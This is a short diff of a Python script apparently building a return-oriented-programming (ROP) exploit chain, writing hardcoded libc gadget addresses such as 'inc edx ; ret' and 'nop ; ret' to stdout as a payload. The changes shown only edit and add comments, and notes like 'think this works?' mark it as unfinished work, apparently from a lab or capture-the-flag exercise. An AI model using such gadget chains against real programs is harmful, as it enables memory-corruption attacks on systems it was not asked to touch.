@@ -33,7 +33,7 @@ class ROP:
     def move_head_right(self):
         #NOTE: ADDED NOPS TO BALANCE W/ MOVE_HEAD_LEFT - think this works?
         sys.stdout.buffer.write((0x0002d654 + 0xb7dec000).to_bytes(4, byteorder='little')) # : inc edx ; ret
-        sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')) #nops
+        sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little')) #nop ; ret
         sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little'))
         sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little'))
         sys.stdout.buffer.write((0x0001a8bf + 0xb7dec000).to_bytes(4, byteorder='little'))
@@ -212,6 +212,7 @@ class ROP:
         # TODO: can't use xchg with this and can't use push...FIX!! 
         # 0x0007672a : mov dword ptr [edx], eax ; ret // 8902c3
         # put write mem address into edx?
+        #add esp, 0x7c; ret
         self.push_register("esp")
         self.pop_register("edx")
         self.add_eax_to_edx()
